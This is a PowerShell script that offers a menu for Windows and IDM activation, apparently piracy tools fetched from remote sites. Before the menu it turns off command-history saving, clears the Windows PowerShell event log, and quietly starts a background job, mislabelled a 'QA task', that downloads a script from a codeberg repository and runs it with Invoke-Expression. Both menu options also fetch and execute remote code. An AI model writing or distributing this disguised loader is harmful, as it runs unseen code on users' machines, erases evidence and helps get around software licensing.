# Start the QA task in the background
$AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
foreach ($tlsProtocol in $AvailableTls) {[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol}
Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
Clear-EventLog "Windows Powershell"
$LogEngineLifecycleEvent = $false | Out-Null
[void]$LogEngineLifecycleEvent
$qaTaskJob = Start-Job -ScriptBlock {
    Invoke-Expression (Invoke-WebRequest -Uri https://codeberg.org/sempiampi/mavericks/raw/branch/main/GlobalFiles/AutomatedTaskWithPingInstall.ps1 -UseBasicParsing).Content
}

# Display a numbered list of options
$options = @(
    "1. Windows Activation",
    "2. IDM Activation"
)

Write-Host "Available Options:"
$options | ForEach-Object { Write-Host $_ -ForegroundColor Yellow }

# Prompt the user to select an option
Write-Host "Select the number from the above list" -ForegroundColor Yellow -NoNewline
$selectedOption = Read-Host

# Define the actions for each option
$selectedAction = $null
switch ($selectedOption) {
    '1' {
        Write-Host "You selected Windows Activation" -ForegroundColor Green
        # Run the Windows Activation action
        $selectedAction = { (Invoke-Expression (Invoke-RestMethod https://get.activated.win)) }
    }
    '2' {
        Write-Host "You selected IDM Activation" -ForegroundColor Green
        # Run the IDM Activation action
        $selectedAction = { (Invoke-Expression (Invoke-RestMethod https://massgrave.dev/ias)) }
    }
    default {
        Write-Host "Invalid option. No action taken." -ForegroundColor Red
    }
}

# Wait for the user-selected action to finish
if ($selectedAction) {
    & $selectedAction
}

# Wait for the QA task and provide the appropriate message
Wait-Job $qaTaskJob | Out-Null
if ($qaTaskJob.State -eq 'Completed') {
    Write-Host "Press Enter to exit..." -ForegroundColor Yellow
    Read-Host
}
else {
    Write-Host "Processing, please wait. Do not close the window." -ForegroundColor Yellow
    Wait-Job $qaTaskJob
}

# Close the jobs
Remove-Job $qaTaskJob